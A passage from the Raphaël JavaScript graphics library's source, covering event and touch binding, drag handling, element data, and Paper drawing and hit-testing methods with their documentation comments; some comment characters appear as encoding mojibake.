type, fn, element) {\n                var f = function (e) {\n                    var pos = getEventPosition(e);\n                    return fn.call(element, e, pos.x, pos.y);\n                };\n                obj.addEventListener(type, f, false);\n\n                if (supportsTouch && touchMap[type]) {\n                    var _f = function (e) {\n                        var pos = getEventPosition(e),\n                            olde = e;\n\n                        for (var i = 0, ii = e.targetTouches && e.targetTouches.length; i < ii; i++) {\n                            if (e.targetTouches[i].target == obj) {\n                                e = e.targetTouches[i];\n                                e.originalEvent = olde;\n                                e.preventDefault = preventTouch;\n                                e.stopPropagation = stopTouch;\n                                break;\n                            }\n                        }\n\n                        return fn.call(element, e, pos.x, pos.y);\n                    };\n                    obj.addEventListener(touchMap[type], _f, false);\n                }\n\n                return function () {\n                    obj.removeEventListener(type, f, false);\n\n                    if (supportsTouch && touchMap[type])\n                        obj.removeEventListener(touchMap[type], _f, false);\n\n                    return true;\n                };\n            };\n        } else if (g.doc.attachEvent) {\n            return function (obj, type, fn, element) {\n                var f = function (e) {\n                    e = e || g.win.event;\n                    var scrollY = g.doc.documentElement.scrollTop || g.doc.body.scrollTop,\n                        scrollX = g.doc.documentElement.scrollLeft || g.doc.body.scrollLeft,\n                        x = e.clientX + scrollX,\n                        y = e.clientY + scrollY;\n                    e.preventDefault = e.preventDefault || preventDefault;\n                    e.stopPropagation = e.stopPropagation || stopPropagation;\n                    return fn.call(element, e, x, y);\n                };\n                obj.attachEvent("on" + type, f);\n                var detacher = function () {\n                    obj.detachEvent("on" + type, f);\n                    return true;\n                };\n                return detacher;\n            };\n        }\n    })(),\n    drag = [],\n    dragMove = function (e) {\n        var x = e.clientX,\n            y = e.clientY,\n            scrollY = g.doc.documentElement.scrollTop || g.doc.body.scrollTop,\n            scrollX = g.doc.documentElement.scrollLeft || g.doc.body.scrollLeft,\n            dragi,\n            j = drag.length;\n        while (j--) {\n            dragi = drag[j];\n            if (supportsTouch && e.touches) {\n                var i = e.touches.length,\n                    touch;\n                while (i--) {\n                    touch = e.touches[i];\n                    if (touch.identifier == dragi.el._drag.id) {\n                        x = touch.clientX;\n                        y = touch.clientY;\n                        (e.originalEvent ? e.originalEvent : e).preventDefault();\n                        break;\n                    }\n                }\n            } else {\n                e.preventDefault();\n            }\n            var node = dragi.el.node,\n                o,\n                next = node.nextSibling,\n                parent = node.parentNode,\n                display = node.style.display;\n            g.win.opera && parent.removeChild(node);\n            node.style.display = "none";\n            o = dragi.el.paper.getElementByPoint(x, y);\n            node.style.display = display;\n            g.win.opera && (next ? parent.insertBefore(node, next) : parent.appendChild(node));\n            o && eve("raphael.drag.over." + dragi.el.id, dragi.el, o);\n            x += scrollX;\n            y += scrollY;\n            eve("raphael.drag.move." + dragi.el.id, dragi.move_scope || dragi.el, x - dragi.el._drag.x, y - dragi.el._drag.y, x, y, e);\n        }\n    },\n    dragUp = function (e) {\n        R.unmousemove(dragMove).unmouseup(dragUp);\n        var i = drag.length,\n            dragi;\n        while (i--) {\n            dragi = drag[i];\n            dragi.el._drag = {};\n            eve("raphael.drag.end." + dragi.el.id, dragi.end_scope || dragi.start_scope || dragi.move_scope || dragi.el, e);\n        }\n        drag = [];\n    },\n    /*\\\n     * Raphael.el\n     [ property (object) ]\n     **\n     * You can add your own method to elements. This is useful when you want to hack default functionality or\n     * want to wrap some common transformation or attributes in one method. In difference to canvas methods,\n     * you can redefine element method at any time. Expending element methods wouldnât affect set.\n     > Usage\n     | Raphael.el.red = function () {\n     |     this.attr({fill: "#f00"});\n     | };\n     | // then use it\n     | paper.circle(100, 100, 20).red();\n    \\*/\n    elproto = R.el = {};\n    /*\\\n     * Element.click\n     [ method ]\n     **\n     * Adds event handler for click for the element.\n     > Parameters\n     - handler (function) handler for the event\n     = (object) @Element\n    \\*/\n    /*\\\n     * Element.unclick\n     [ method ]\n     **\n     * Removes event handler for click for the element.\n     > Parameters\n     - handler (function) #optional handler for the event\n     = (object) @Element\n    \\*/\n\n    /*\\\n     * Element.dblclick\n     [ method ]\n     **\n     * Adds event handler for double click for the element.\n     > Parameters\n     - handler (function) handler for the event\n     = (object) @Element\n    \\*/\n    /*\\\n     * Element.undblclick\n     [ method ]\n     **\n     * Removes event handler for double click for the element.\n     > Parameters\n     - handler (function) #optional handler for the event\n     = (object) @Element\n    \\*/\n\n    /*\\\n     * Element.mousedown\n     [ method ]\n     **\n     * Adds event handler for mousedown for the element.\n     > Parameters\n     - handler (function) handler for the event\n     = (object) @Element\n    \\*/\n    /*\\\n     * Element.unmousedown\n     [ method ]\n     **\n     * Removes event handler for mousedown for the element.\n     > Parameters\n     - handler (function) #optional handler for the event\n     = (object) @Element\n    \\*/\n\n    /*\\\n     * Element.mousemove\n     [ method ]\n     **\n     * Adds event handler for mousemove for the element.\n     > Parameters\n     - handler (function) handler for the event\n     = (object) @Element\n    \\*/\n    /*\\\n     * Element.unmousemove\n     [ method ]\n     **\n     * Removes event handler for mousemove for the element.\n     > Parameters\n     - handler (function) #optional handler for the event\n     = (object) @Element\n    \\*/\n\n    /*\\\n     * Element.mouseout\n     [ method ]\n     **\n     * Adds event handler for mouseout for the element.\n     > Parameters\n     - handler (function) handler for the event\n     = (object) @Element\n    \\*/\n    /*\\\n     * Element.unmouseout\n     [ method ]\n     **\n     * Removes event handler for mouseout for the element.\n     > Parameters\n     - handler (function) #optional handler for the event\n     = (object) @Element\n    \\*/\n\n    /*\\\n     * Element.mouseover\n     [ method ]\n     **\n     * Adds event handler for mouseover for the element.\n     > Parameters\n     - handler (function) handler for the event\n     = (object) @Element\n    \\*/\n    /*\\\n     * Element.unmouseover\n     [ method ]\n     **\n     * Removes event handler for mouseover for the element.\n     > Parameters\n     - handler (function) #optional handler for the event\n     = (object) @Element\n    \\*/\n\n    /*\\\n     * Element.mouseup\n     [ method ]\n     **\n     * Adds event handler for mouseup for the element.\n     > Parameters\n     - handler (function) handler for the event\n     = (object) @Element\n    \\*/\n    /*\\\n     * Element.unmouseup\n     [ method ]\n     **\n     * Removes event handler for mouseup for the element.\n     > Parameters\n     - handler (function) #optional handler for the event\n     = (object) @Element\n    \\*/\n\n    /*\\\n     * Element.touchstart\n     [ method ]\n     **\n     * Adds event handler for touchstart for the element.\n     > Parameters\n     - handler (function) handler for the event\n     = (object) @Element\n    \\*/\n    /*\\\n     * Element.untouchstart\n     [ method ]\n     **\n     * Removes event handler for touchstart for the element.\n     > Parameters\n     - handler (function) #optional handler for the event\n     = (object) @Element\n    \\*/\n\n    /*\\\n     * Element.touchmove\n     [ method ]\n     **\n     * Adds event handler for touchmove for the element.\n     > Parameters\n     - handler (function) handler for the event\n     = (object) @Element\n    \\*/\n    /*\\\n     * Element.untouchmove\n     [ method ]\n     **\n     * Removes event handler for touchmove for the element.\n     > Parameters\n     - handler (function) #optional handler for the event\n     = (object) @Element\n    \\*/\n\n    /*\\\n     * Element.touchend\n     [ method ]\n     **\n     * Adds event handler for touchend for the element.\n     > Parameters\n     - handler (function) handler for the event\n     = (object) @Element\n    \\*/\n    /*\\\n     * Element.untouchend\n     [ method ]\n     **\n     * Removes event handler for touchend for the element.\n     > Parameters\n     - handler (function) #optional handler for the event\n     = (object) @Element\n    \\*/\n\n    /*\\\n     * Element.touchcancel\n     [ method ]\n     **\n     * Adds event handler for touchcancel for the element.\n     > Parameters\n     - handler (function) handler for the event\n     = (object) @Element\n    \\*/\n    /*\\\n     * Element.untouchcancel\n     [ method ]\n     **\n     * Removes event handler for touchcancel for the element.\n     > Parameters\n     - handler (function) #optional handler for the event\n     = (object) @Element\n    \\*/\n    for (var i = events.length; i--;) {\n        (function (eventName) {\n            R[eventName] = elproto[eventName] = function (fn, scope) {\n                if (R.is(fn, "function")) {\n                    this.events = this.events || [];\n                    this.events.push({name: eventName, f: fn, unbind: addEvent(this.shape || this.node || g.doc, eventName, fn, scope || this)});\n                }\n                return this;\n            };\n            R["un" + eventName] = elproto["un" + eventName] = function (fn) {\n                var events = this.events || [],\n                    l = events.length;\n                while (l--){\n                    if (events[l].name == eventName && (R.is(fn, "undefined") || events[l].f == fn)) {\n                        events[l].unbind();\n                        events.splice(l, 1);\n                        !events.length && delete this.events;\n                    }\n                }\n                return this;\n            };\n        })(events[i]);\n    }\n\n    /*\\\n     * Element.data\n     [ method ]\n     **\n     * Adds or retrieves given value associated with given key.\n     **\n     * See also @Element.removeData\n     > Parameters\n     - key (string) key to store data\n     - value (any) #optional value to store\n     = (object) @Element\n     * or, if value is not specified:\n     = (any) value\n     * or, if key and value are not specified:\n     = (object) Key/value pairs for all the data associated with the element.\n     > Usage\n     | for (var i = 0, i < 5, i++) {\n     |     paper.circle(10 + 15 * i, 10, 10)\n     |          .attr({fill: "#000"})\n     |          .data("i", i)\n     |          .click(function () {\n     |             alert(this.data("i"));\n     |          });\n     | }\n    \\*/\n    elproto.data = function (key, value) {\n        var data = eldata[this.id] = eldata[this.id] || {};\n        if (arguments.length == 0) {\n            return data;\n        }\n        if (arguments.length == 1) {\n            if (R.is(key, "object")) {\n                for (var i in key) if (key[has](i)) {\n                    this.data(i, key[i]);\n                }\n                return this;\n            }\n            eve("raphael.data.get." + this.id, this, data[key], key);\n            return data[key];\n        }\n        data[key] = value;\n        eve("raphael.data.set." + this.id, this, value, key);\n        return this;\n    };\n    /*\\\n     * Element.removeData\n     [ method ]\n     **\n     * Removes value associated with an element by given key.\n     * If key is not provided, removes all the data of the element.\n     > Parameters\n     - key (string) #optional key\n     = (object) @Element\n    \\*/\n    elproto.removeData = function (key) {\n        if (key == null) {\n            delete eldata[this.id];\n        } else {\n            eldata[this.id] && delete eldata[this.id][key];\n        }\n        return this;\n    };\n     /*\\\n     * Element.getData\n     [ method ]\n     **\n     * Retrieves the element data\n     = (object) data\n    \\*/\n    elproto.getData = function () {\n        return clone(eldata[this.id] || {});\n    };\n    /*\\\n     * Element.hover\n     [ method ]\n     **\n     * Adds event handlers for hover for the element.\n     > Parameters\n     - f_in (function) handler for hover in\n     - f_out (function) handler for hover out\n     - icontext (object) #optional context for hover in handler\n     - ocontext (object) #optional context for hover out handler\n     = (object) @Element\n    \\*/\n    elproto.hover = function (f_in, f_out, scope_in, scope_out) {\n        return this.mouseover(f_in, scope_in).mouseout(f_out, scope_out || scope_in);\n    };\n    /*\\\n     * Element.unhover\n     [ method ]\n     **\n     * Removes event handlers for hover for the element.\n     > Parameters\n     - f_in (function) handler for hover in\n     - f_out (function) handler for hover out\n     = (object) @Element\n    \\*/\n    elproto.unhover = function (f_in, f_out) {\n        return this.unmouseover(f_in).unmouseout(f_out);\n    };\n    var draggable = [];\n    /*\\\n     * Element.drag\n     [ method ]\n     **\n     * Adds event handlers for drag of the element.\n     > Parameters\n     - onmove (function) handler for moving\n     - onstart (function) handler for drag start\n     - onend (function) handler for drag end\n     - mcontext (object) #optional context for moving handler\n     - scontext (object) #optional context for drag start handler\n     - econtext (object) #optional context for drag end handler\n     * Additionally following `drag` events will be triggered: `drag.start.<id>` on start,\n     * `drag.end.<id>` on end and `drag.move.<id>` on every move. When element will be dragged over another element\n     * `drag.over.<id>` will be fired as well.\n     *\n     * Start event and start handler will be called in specified context or in context of the element with following parameters:\n     o x (number) x position of the mouse\n     o y (number) y position of the mouse\n     o event (object) DOM event object\n     * Move event and move handler will be called in specified context or in context of the element with following parameters:\n     o dx (number) shift by x from the start point\n     o dy (number) shift by y from the start point\n     o x (number) x position of the mouse\n     o y (number) y position of the mouse\n     o event (object) DOM event object\n     * End event and end handler will be called in specified context or in context of the element with following parameters:\n     o event (object) DOM event object\n     = (object) @Element\n    \\*/\n    elproto.drag = function (onmove, onstart, onend, move_scope, start_scope, end_scope) {\n        function start(e) {\n            (e.originalEvent || e).preventDefault();\n            var x = e.clientX,\n                y = e.clientY,\n                scrollY = g.doc.documentElement.scrollTop || g.doc.body.scrollTop,\n                scrollX = g.doc.documentElement.scrollLeft || g.doc.body.scrollLeft;\n            this._drag.id = e.identifier;\n            if (supportsTouch && e.touches) {\n                var i = e.touches.length, touch;\n                while (i--) {\n                    touch = e.touches[i];\n                    this._drag.id = touch.identifier;\n                    if (touch.identifier == this._drag.id) {\n                        x = touch.clientX;\n                        y = touch.clientY;\n                        break;\n                    }\n                }\n            }\n            this._drag.x = x + scrollX;\n            this._drag.y = y + scrollY;\n            !drag.length && R.mousemove(dragMove).mouseup(dragUp);\n            drag.push({el: this, move_scope: move_scope, start_scope: start_scope, end_scope: end_scope});\n            onstart && eve.on("raphael.drag.start." + this.id, onstart);\n            onmove && eve.on("raphael.drag.move." + this.id, onmove);\n            onend && eve.on("raphael.drag.end." + this.id, onend);\n            eve("raphael.drag.start." + this.id, start_scope || move_scope || this, this._drag.x, this._drag.y, e);\n        }\n        this._drag = {};\n        draggable.push({el: this, start: start});\n        this.mousedown(start);\n        return this;\n    };\n    /*\\\n     * Element.onDragOver\n     [ method ]\n     **\n     * Shortcut for assigning event handler for `drag.over.<id>` event, where id is id of the element (see @Element.id).\n     > Parameters\n     - f (function) handler for event, first argument would be the element you are dragging over\n    \\*/\n    elproto.onDragOver = function (f) {\n        f ? eve.on("raphael.drag.over." + this.id, f) : eve.unbind("raphael.drag.over." + this.id);\n    };\n    /*\\\n     * Element.undrag\n     [ method ]\n     **\n     * Removes all drag event handlers from given element.\n    \\*/\n    elproto.undrag = function () {\n        var i = draggable.length;\n        while (i--) if (draggable[i].el == this) {\n            this.unmousedown(draggable[i].start);\n            draggable.splice(i, 1);\n            eve.unbind("raphael.drag.*." + this.id);\n        }\n        !draggable.length && R.unmousemove(dragMove).unmouseup(dragUp);\n        drag = [];\n    };\n    /*\\\n     * Paper.circle\n     [ method ]\n     **\n     * Draws a circle.\n     **\n     > Parameters\n     **\n     - x (number) x coordinate of the centre\n     - y (number) y coordinate of the centre\n     - r (number) radius\n     = (object) RaphaÃ«l element object with type âcircleâ\n     **\n     > Usage\n     | var c = paper.circle(50, 50, 40);\n    \\*/\n    paperproto.circle = function (x, y, r) {\n        var out = R._engine.circle(this, x || 0, y || 0, r || 0);\n        this.__set__ && this.__set__.push(out);\n        return out;\n    };\n    /*\\\n     * Paper.rect\n     [ method ]\n     *\n     * Draws a rectangle.\n     **\n     > Parameters\n     **\n     - x (number) x coordinate of the top left corner\n     - y (number) y coordinate of the top left corner\n     - width (number) width\n     - height (number) height\n     - r (number) #optional radius for rounded corners, default is 0\n     = (object) RaphaÃ«l element object with type ârectâ\n     **\n     > Usage\n     | // regular rectangle\n     | var c = paper.rect(10, 10, 50, 50);\n     | // rectangle with rounded corners\n     | var c = paper.rect(40, 40, 50, 50, 10);\n    \\*/\n    paperproto.rect = function (x, y, w, h, r) {\n        var out = R._engine.rect(this, x || 0, y || 0, w || 0, h || 0, r || 0);\n        this.__set__ && this.__set__.push(out);\n        return out;\n    };\n    /*\\\n     * Paper.ellipse\n     [ method ]\n     **\n     * Draws an ellipse.\n     **\n     > Parameters\n     **\n     - x (number) x coordinate of the centre\n     - y (number) y coordinate of the centre\n     - rx (number) horizontal radius\n     - ry (number) vertical radius\n     = (object) RaphaÃ«l element object with type âellipseâ\n     **\n     > Usage\n     | var c = paper.ellipse(50, 50, 40, 20);\n    \\*/\n    paperproto.ellipse = function (x, y, rx, ry) {\n        var out = R._engine.ellipse(this, x || 0, y || 0, rx || 0, ry || 0);\n        this.__set__ && this.__set__.push(out);\n        return out;\n    };\n    /*\\\n     * Paper.path\n     [ method ]\n     **\n     * Creates a path element by given path data string.\n     > Parameters\n     - pathString (string) #optional path string in SVG format.\n     * Path string consists of one-letter commands, followed by comma seprarated arguments in numercal form. Example:\n     | "M10,20L30,40"\n     * Here we can see two commands: âMâ, with arguments `(10, 20)` and âLâ with arguments `(30, 40)`. Upper case letter mean command is absolute, lower caseârelative.\n     *\n     # <p>Here is short list of commands available, for more details see <a href="https://www.w3.org/TR/SVG/paths.html#PathData" title="Details of a path\'s data attribute\'s format are described in the SVG specification.">SVG path string format</a>.</p>\n     # <table><thead><tr><th>Command</th><th>Name</th><th>Parameters</th></tr></thead><tbody>\n     # <tr><td>M</td><td>moveto</td><td>(x y)+</td></tr>\n     # <tr><td>Z</td><td>closepath</td><td>(none)</td></tr>\n     # <tr><td>L</td><td>lineto</td><td>(x y)+</td></tr>\n     # <tr><td>H</td><td>horizontal lineto</td><td>x+</td></tr>\n     # <tr><td>V</td><td>vertical lineto</td><td>y+</td></tr>\n     # <tr><td>C</td><td>curveto</td><td>(x1 y1 x2 y2 x y)+</td></tr>\n     # <tr><td>S</td><td>smooth curveto</td><td>(x2 y2 x y)+</td></tr>\n     # <tr><td>Q</td><td>quadratic BÃ©zier curveto</td><td>(x1 y1 x y)+</td></tr>\n     # <tr><td>T</td><td>smooth quadratic BÃ©zier curveto</td><td>(x y)+</td></tr>\n     # <tr><td>A</td><td>elliptical arc</td><td>(rx ry x-axis-rotation large-arc-flag sweep-flag x y)+</td></tr>\n     # <tr><td>R</td><td><a href="https://en.wikipedia.org/wiki/CatmullâRom_spline#Catmull.E2.80.93Rom_spline">Catmull-Rom curveto</a>*</td><td>x1 y1 (x y)+</td></tr></tbody></table>\n     * * âCatmull-Rom curvetoâ is a not standard SVG command and added in 2.0 to make life easier.\n     * Note: there is a special case when path consist of just three commands: âM10,10Râ¦zâ. In this case path will smoothly connects to its beginning.\n     > Usage\n     | var c = paper.path("M10 10L90 90");\n     | // draw a diagonal line:\n     | // move to 10,10, line to 90,90\n     * For example of path strings, check out these icons: https://raphaeljs.com/icons/\n    \\*/\n    paperproto.path = function (pathString) {\n        pathString && !R.is(pathString, string) && !R.is(pathString[0], array) && (pathString += E);\n        var out = R._engine.path(R.format[apply](R, arguments), this);\n        this.__set__ && this.__set__.push(out);\n        return out;\n    };\n    /*\\\n     * Paper.image\n     [ method ]\n     **\n     * Embeds an image into the surface.\n     **\n     > Parameters\n     **\n     - src (string) URI of the source image\n     - x (number) x coordinate position\n     - y (number) y coordinate position\n     - width (number) width of the image\n     - height (number) height of the image\n     = (object) RaphaÃ«l element object with type âimageâ\n     **\n     > Usage\n     | var c = paper.image("apple.png", 10, 10, 80, 80);\n    \\*/\n    paperproto.image = function (src, x, y, w, h) {\n        var out = R._engine.image(this, src || "about:blank", x || 0, y || 0, w || 0, h || 0);\n        this.__set__ && this.__set__.push(out);\n        return out;\n    };\n    /*\\\n     * Paper.text\n     [ method ]\n     **\n     * Draws a text string. If you need line breaks, put â\\nâ in the string.\n     **\n     > Parameters\n     **\n     - x (number) x coordinate position\n     - y (number) y coordinate position\n     - text (string) The text string to draw\n     = (object) RaphaÃ«l element object with type âtextâ\n     **\n     > Usage\n     | var t = paper.text(50, 50, "RaphaÃ«l\\nkicks\\nbutt!");\n    \\*/\n    paperproto.text = function (x, y, text) {\n        var out = R._engine.text(this, x || 0, y || 0, Str(text));\n        this.__set__ && this.__set__.push(out);\n        return out;\n    };\n    /*\\\n     * Paper.set\n     [ method ]\n     **\n     * Creates array-like object to keep and operate several elements at once.\n     * Warning: it doesnât create any elements for itself in the page, it just groups existing elements.\n     * Sets act as pseudo elements â all methods available to an element can be used on a set.\n     = (object) array-like object that represents set of elements\n     **\n     > Usage\n     | var st = paper.set();\n     | st.push(\n     |     paper.circle(10, 10, 5),\n     |     paper.circle(30, 10, 5)\n     | );\n     | st.attr({fill: "red"}); // changes the fill of both circles\n    \\*/\n    paperproto.set = function (itemsArray) {\n        !R.is(itemsArray, "array") && (itemsArray = Array.prototype.splice.call(arguments, 0, arguments.length));\n        var out = new Set(itemsArray);\n        this.__set__ && this.__set__.push(out);\n        out["paper"] = this;\n        out["type"] = "set";\n        return out;\n    };\n    /*\\\n     * Paper.setStart\n     [ method ]\n     **\n     * Creates @Paper.set. All elements that will be created after calling this method and before calling\n     * @Paper.setFinish will be added to the set.\n     **\n     > Usage\n     | paper.setStart();\n     | paper.circle(10, 10, 5),\n     | paper.circle(30, 10, 5)\n     | var st = paper.setFinish();\n     | st.attr({fill: "red"}); // changes the fill of both circles\n    \\*/\n    paperproto.setStart = function (set) {\n        this.__set__ = set || this.set();\n    };\n    /*\\\n     * Paper.setFinish\n     [ method ]\n     **\n     * See @Paper.setStart. This method finishes catching and returns resulting set.\n     **\n     = (object) set\n    \\*/\n    paperproto.setFinish = function (set) {\n        var out = this.__set__;\n        delete this.__set__;\n        return out;\n    };\n    /*\\\n     * Paper.getSize\n     [ method ]\n     **\n     * Obtains current paper actual size.\n     **\n     = (object)\n     \\*/\n    paperproto.getSize = function () {\n        var container = this.canvas.parentNode;\n        return {\n            width: container.offsetWidth,\n            height: container.offsetHeight\n                };\n        };\n    /*\\\n     * Paper.setSize\n     [ method ]\n     **\n     * If you need to change dimensions of the canvas call this method\n     **\n     > Parameters\n     **\n     - width (number) new width of the canvas\n     - height (number) new height of the canvas\n    \\*/\n    paperproto.setSize = function (width, height) {\n        return R._engine.setSize.call(this, width, height);\n    };\n    /*\\\n     * Paper.setViewBox\n     [ method ]\n     **\n     * Sets the view box of the paper. Practically it gives you ability to zoom and pan whole paper surface by\n     * specifying new boundaries.\n     **\n     > Parameters\n     **\n     - x (number) new x position, default is `0`\n     - y (number) new y position, default is `0`\n     - w (number) new width of the canvas\n     - h (number) new height of the canvas\n     - fit (boolean) `true` if you want graphics to fit into new boundary box\n    \\*/\n    paperproto.setViewBox = function (x, y, w, h, fit) {\n        return R._engine.setViewBox.call(this, x, y, w, h, fit);\n    };\n    /*\\\n     * Paper.top\n     [ property ]\n     **\n     * Points to the topmost element on the paper\n    \\*/\n    /*\\\n     * Paper.bottom\n     [ property ]\n     **\n     * Points to the bottom element on the paper\n    \\*/\n    paperproto.top = paperproto.bottom = null;\n    /*\\\n     * Paper.raphael\n     [ property ]\n     **\n     * Points to the @Raphael object/function\n    \\*/\n    paperproto.raphael = R;\n    var getOffset = function (elem) {\n        var box = elem.getBoundingClientRect(),\n            doc = elem.ownerDocument,\n            body = doc.body,\n            docElem = doc.documentElement,\n            clientTop = docElem.clientTop || body.clientTop || 0, clientLeft = docElem.clientLeft || body.clientLeft || 0,\n            top  = box.top  + (g.win.pageYOffset || docElem.scrollTop || body.scrollTop ) - clientTop,\n            left = box.left + (g.win.pageXOffset || docElem.scrollLeft || body.scrollLeft) - clientLeft;\n        return {\n            y: top,\n            x: left\n        };\n    };\n    /*\\\n     * Paper.getElementByPoint\n     [ method ]\n     **\n     * Returns you topmost element under given point.\n     **\n     = (object) RaphaÃ«l element object\n     > Parameters\n     **\n     - x (number) x coordinate from the top left corner of the window\n     - y (number) y coordinate from the top left corner of the window\n     > Usage\n     | paper.getElementByPoint(mouseX, mouseY).attr({stroke: "#f00"});\n    \\*/\n    paperproto.getElementByPoint = function (x, y) {\n        var paper = this,\n            svg = paper.canvas,\n            target = g.doc.elementFromPoint(x, y);\n        if (g.win.opera && target.tagName == "svg") {\n            var so = getOffset(svg),\n                sr = svg.createSVGRect();\n            sr.x = x - so.x;\n            sr.y = y - so.y;\n            sr.width = sr.height = 1;\n            var hits = svg.getIntersectionList(sr, null);\n            if (hits.length) {\n                target = hits[hits.length - 1];\n            }\n        }\n        if (!target) {\n            return null;\n        }\n        while (target.parentNode && target != svg.parentNode && !target.raphael) {\n            target = target.parentNode;\n        }\n        target == paper.canvas.parentNode && (target = svg);\n        target = target && target.raphael ? paper.getById(target.raphaelid) : null;\n        return target;\n    };\n\n    /*\\\n     * Paper.getElementsByBBox\n     [ method ]\n     **\n     * Returns set of elements that have an intersecting bounding box\n     **\n     > Parameters\n     **\n     - bbox (object) bbox to check with\n     = (object) @Set\n     \\*/\n    paperproto.getElementsByBBox = function (bbox) {\n        var set = this.set();\n        this.forEach(function (el) {\n            if (R.isBBoxIntersect(el.getBBox(), bbox)) {\n                set.push(el);\n            }\n        });\n        return set;\n    };\n\n    /*\\\n     * Paper.getById\n     [ method ]\n     **\n     * Returns you element by its internal ID.\n     **\n     > Parameters\n     **\n     - id (number) id\n     = (object) RaphaÃ«l element object\n    \\*/\n    paperproto.getById = function (id) {\n        var bot = this.bottom;\n        while (bot) {\n            if (bot.id == id) {\n                return bot;\n            }\n            bot = bot.next;\n        }\n        return null;\n    };\n    /*\\\n     * Paper.forEach\n     [ method ]\n     **\n     * Executes given function for each element on the paper\n     *\n     * If callback function returns `false` it will stop loop running.\n     **\n     > Parameters\n     **\n     - callback (function) function to run\n     - thisArg (object) context object for the callback\n     = (object) Paper object\n     > Usage\n     | paper.forEach(function (el) {\n     |     el.attr({ stroke: "blue" });\n     | });\n    \\*/\n    paperproto.forEach = function (callback, thisArg) {\n        var bot = this.bottom;\n        while (bot) {\n            if (callback.call(thisArg, bot) === false) {\n                return this;\n            }\n            bot = bot.next;\n        }\n        return this;\n    };\n    /*\\\n     * Paper.getElementsByPoint\n     [ method ]\n     **\n     * Returns set of elements that have common point inside\n     **\n     > Parameters\n     **\n     - x (number) x coordinate of the point\n     - y (number) y coordinate of the point\n     = (object) @Set\n    \\*/\n    paperproto.getElementsByPoint = function (x, y) {\n        var set = this.set();\n        this.forEach(function (el) {\n            if (el.isPointInside(x, y)) {\n                set.push(el);\n            }\n        });\n        return set;\n    };\n    function x_y() {\n        return this.x + S + this.y;\n    }\n    function x_y_w_h() {\n        return this.x + S + this.y + S + this.width + " \\xd7 " + this.height;\n    }\n    /*\\\n     * Element.isPointInside\n     [ method ]\n     **\n     * Determine if given point is inside this elementâs shape\n     **\n     > Parameters\n     **\n     - x (number) x coordinate of the point\n     - y (number) y coordinate of the point\n     = (boolean) `true` if point inside the shape\n    \\*/\n    elproto.isPointInside = function (x, y) {\n        var rp = this.realPath = getPath[this.type](this);\n        if (this.attr(\'transform\') && this.attr(\'transform\').length) {\n            rp = R.transformPath(rp, this.attr(\'transform\'));\n        }\n        return R.isPointInsidePath(rp, x, y);\n    };\n    /*\\\n     * Element.getBBox\n     [ method ]\n     **\n     * Return bounding box for a given element\n     **\n     > Parameters\n     **\n     - isWithoutTransform (boolean) flag, `true` if you want to have bounding box before transformations. Default is `false`.\n     = (object) Bounding box object:\n     o {\n     o     x: (number) top left corner x\n     o     y: (number) top left corner y\n     o     x2: (number) bottom right corner x\n     o     y2: (number) bottom right corner y\n     o     width: (number) width\n     o     height: (number) height\n     o }\n    \\*/\n    elproto.getBBox = function (isWithoutTransform) {\n        if (this.removed) {\n            return {};\n        }\n        var _ = this._;\n        if (isWithoutTransform) {\n            if (_.dirty || !_.bboxwt) {\n                this.realPath = getPath[this.type](this);\n                _.bboxwt = pathDimensions(this.realPath);\n                _.bboxwt.toString = x_y_w_h;\n                _.dirty = 0;\n            }\n            return _.bboxwt;\n        }\n        if (_.dirty || _.dirtyT || !_.bbox) {\n            if (_.dirty || !this.realPath) {\n                _.bboxwt = 0;\n                this.realPath = getPath[this.type](this);\n            }\n            _.bbox = pathDimensions(mapPath(this.realPath, this.matrix));\n            _.bbox.toString = x_y_w_h;\n            _.dirty = _.dirtyT = 0;\n        }\n        return _.bbox;\n    };\n    /*\\\n     * Element.clone\n     [ method ]\n     **\n     = (object) clone of a given element\n     **\n    \\*/\n    elproto.clone = function () {\n        if (this.removed) {\n            return null;\n        }\n        var out = this.paper[this.type]().attr(this.attr());\n        this.__set__ && this.__set__.push(out);\n        return out;\n    };\n    /*\\\n     * Element.glow\n     [ method ]\n     **\n     * Return set of elements that create glow-like effect around given element. See @Paper.set.\n     *\n     * Note: Glow is not connected to the element. If you change element attributes it wonât adjust itself.\n     **\n     > Parameters\n     **\n     - glow (object) #optional parameters object with all properties optional:\n     o {\n     o     width (number) size of the glow, default is `10`\n     o     fill (boolean) will it be filled, default is `false`\n     o     opacity (number) opacity, default is `0.5`\n     o     offsetx (number) horizontal offset, default is `0`\n     o     offsety (number) vertical offset, default is `0`\n     o     color (string) glow colour, default is `black`\n     o }\n     = (object) @Paper.set of elements that represents glow\n    \\*/\n    elproto.glow = function (glow) {\n        if (this.type == "text") {\n            return null;\n        }\n        glow = glow || {};\n        var s = {\n            width: (glow.width || 10) + (+this.attr("stroke-width") || 1),\n            fill: glow.fill || false,\n            opacity: glow.opacity == null ? .5 : glow.opacity,\n            offsetx: glow.offsetx || 0,\n            offsety: glow.offsety || 0,\n            color: glow.color || "#000"\n        },\n            c = s.width / 2,\n            r = this.paper,\n            out = r.set(),\n            path = this.realPath || getPath[this.type](this);\n        path = this.matrix ? mapPath(path, this.matrix) : path;\n        for (var i = 1; i < c + 1; i++) {\n            out.push(r.path(path).attr({\n                stroke: s.color,\n                fill: s.fill ? s.color : "none",\n                "stroke-linejoin": "round",\n                "stroke-linecap": "round",\n                "stroke-width": +(s.width / c * i).toFixed(3),\n                opacity: +(s.opacity / c).toFixed(3)\n            }));\n        }\n        return out.insertBefore(this).translate(s.offsetx, s.offsety);\n    };\n    var curveslengths = {},\n    getPointAtSegmentLength = function (p1x, p1y, c1x, c1y, c2x, c2y, p2x, p2y, length) {\n        if (length == null) {\n            return bezlen(p1x, p1y, c1x, c1y, c2x, c2y, p2x, p2y);\n        } else {\n            return R.findDotsAtSegment(p1x, p1y, c1x, c1y, c2x, c2y, p2x, p2y, getTatLen(p1x, p1y, c1x, c1y, c2x, c2y, p2x, p2y, length));\n        }\n    },\n    getLengthFactory = function (istotal, subpath) {\n        return function (path, length, onlystart) {\n            path = path2curve(path);\n            var x, y, p, l, sp = "", subpaths = {}, point,\n                len = 0;\n            for (var i = 0, ii = path.length; i < ii; i++) {\n                p = path[i];\n                if (p[0] == "M") {\n                    x = +p[1];\n                    y = +p[2];\n                } else {\n                    l = getPointAtSegmentLength(x, y, p[1], p[2], p[3], p[4], p[5], p[6]);\n                    if (len + l > length) {\n                        if (subpath && !subpaths.start) {\n                            point = getPointAtSegmentLength(x, y, p[1], p[2], p[3], p[4], p[5], p[6], length - len);\n                            sp += ["C" + point.start.x, point.start.y, point.m.x, point.m.y, point.x, point.y];\n                            if (onlystart) {return 